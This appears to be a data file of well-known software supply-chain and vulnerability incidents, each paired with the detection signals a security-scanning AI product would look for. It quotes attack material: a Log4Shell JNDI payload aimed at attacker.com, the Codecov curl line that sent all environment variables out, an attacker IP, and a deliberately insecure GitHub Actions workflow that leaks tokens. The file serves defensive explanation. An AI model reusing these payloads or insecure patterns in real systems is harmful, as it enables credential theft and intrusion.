name: NPM ua-parser-js Supply Chain Attack
impact: 8 million weekly downloads compromised with cryptominer and password stealer
financial_impact: $Unknown - Crypto mining on millions of machines
description: Attacker gained access to the ua-parser-js NPM package (8M weekly downloads) and published versions 0.7.29, 0.8.0, and 1.0.0 containing a cryptominer and credential stealer targeting Windows and Linux.
what_happened: The attacker hijacked the maintainer's NPM account, published malicious versions that included preinstall scripts downloading and executing cryptominers and password-stealing malware.
our_detection: Our AI would detect the suspicious preinstall script, obfuscated code, network calls to unknown C2 servers, and execution of downloaded binaries.
detection_points: Suspicious preinstall script executing arbitrary commands
exec() with hardcoded external IP address
Network calls to suspicious IP addresses

name: Log4Shell (Apache Log4j)
impact: Estimated 93% of enterprise cloud environments affected
description: A critical zero-day vulnerability in Apache Log4j 2, a ubiquitous Java logging library. Allows remote code execution via JNDI injection through log messages.
what_happened: Attackers could exploit the Log4j lookup feature by sending specially crafted strings (${jndi:ldap://attacker.com/payload}) to any application using Log4j, achieving remote code execution on the server.
our_detection: Our AI would detect the vulnerable Log4j dependency version, JNDI lookup patterns, and unsafe string interpolation in logging statements.
detection_points: User input directly passed to logger methods
Potential JNDI injection via log message interpolation

name: Lodash Prototype Pollution
impact: 4.3 million repositories using vulnerable lodash versions
description: The lodash functions defaultsDeep, merge, and zipObjectDeep allow prototype pollution, enabling attackers to modify Object.prototype and affect all objects in a JavaScript application.
what_happened: An attacker could craft a malicious JSON payload that, when processed by lodash's defaultsDeep or merge functions, would inject properties into Object.prototype, leading to denial of service or remote code execution.
our_detection: Our AI would detect the vulnerable lodash version in package.json and flag the usage of defaultsDeep/merge with user-controlled input.
detection_points: No input validation or prototype pollution protection

name: Codecov Supply Chain Attack
impact: 29,000+ customers potentially exposed, including Twitch, HashiCorp, and others
description: Attackers modified Codecov's Bash Uploader script to exfiltrate environment variables (including CI/CD secrets, API tokens, and credentials) from users' CI/CD pipelines.
what_happened: The attacker exploited a flaw in Codecov's Docker image creation process to modify the bash uploader script, adding a single line that sent all environment variables to an attacker-controlled server.
our_detection: Our AI would detect the suspicious curl command exfiltrating environment variables to an external server and the unauthorized modification of CI scripts.
vulnerable_code:
#!/bin/bash
# Codecov Bash Uploader (compromised version)

# ... normal codecov upload logic ...

# MALICIOUS LINE ADDED BY ATTACKER:
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://collector.codecov.io/upload/v2 || true

# This line:
# 1. Captures all git remote URLs (repo info)
# 2. Captures ALL environment variables (env)
# 3. Sends them to codecov.io (which was compromised)
# 4. The || true ensures script continues even if exfil fails
# 5. -sm 0.5 sets a short timeout to avoid detection
detection_points: Suspicious curl command sending env data to external server
Silent failure with || true to avoid detection

name: SolarWinds SUNBURST
impact: 18,000+ organizations including US government agencies, Fortune 500 companies
financial_impact: $100+ million for SolarWinds alone, billions industry-wide
description: Nation-state attackers compromised SolarWinds' build system to inject the SUNBURST backdoor into the Orion IT monitoring platform update, distributing it to 18,000+ customers.
what_happened: The attacker inserted malicious code into the SolarWinds Orion build process. The backdoor communicated via DNS to command-and-control servers, disguised as legitimate Orion traffic, allowing full remote access.
our_detection: Our AI would detect the obfuscated backdoor code, suspicious DNS communication patterns, and unusual build-time code injection.
detection_points: Obfuscated class names designed to blend with legitimate code

name: GitHub Actions Token Exposure
impact: Multiple repositories had GITHUB_TOKEN leaked through workflow artifacts and logs
description: Multiple projects exposed their GITHUB_TOKEN through GitHub Actions workflows by printing environment variables in logs, uploading artifacts containing tokens, or using pull_request_target insecurely.
what_happened: Developers unknowingly exposed repository write tokens in their CI/CD workflows. Attackers could use these tokens to push malicious code, create releases, or modify repository settings.
our_detection: Our AI would detect the insecure workflow patterns, environment variable logging, and dangerous pull_request_target usage.
vulnerable_code:
# .github/workflows/ci.yml
name: CI Pipeline
on:
  pull_request_target:  # DANGEROUS: runs with write access on fork PRs
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out FORK code with WRITE token
      
      - name: Debug Info
        run: |
          echo "Token: ${{ secrets.GITHUB_TOKEN }}"  # Token leaked in logs!
          env  # ALL secrets potentially exposed
      
      - name: Run Tests
        run: npm test
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      
      - uses: actions/upload-artifact@v3
        with:
          name: build-output
          path: .  # Uploads .git directory with token!
detection_points: pull_request_target with checkout of PR head (fork code with write access)
Secrets printed to workflow logs via echo
env command dumping all environment variables
Uploading entire directory as artifact (includes .git with tokens)
GITHUB_TOKEN passed as environment variable to untrusted code

name: event-stream NPM Package Compromise
impact: 2 million weekly downloads, targeted Bitcoin wallet theft
financial_impact: Targeted theft from Copay Bitcoin wallets
description: A new maintainer was given access to the popular event-stream package and added a dependency (flatmap-stream) containing encrypted malicious code designed to steal Bitcoin from the Copay wallet application.
what_happened: The attacker gained trust of the original maintainer, was given publishing rights, added a malicious dependency that contained AES-encrypted payload targeting Copay wallet users, stealing their Bitcoin private keys.
our_detection: Our AI would detect the obfuscated payload, suspicious dependency addition, encrypted code execution, and targeting of cryptocurrency wallet data.
detection_points: Obfuscated code in minified test files
HTTP request to hardcoded IP address (111.90.151.35)
New dependency added by new maintainer
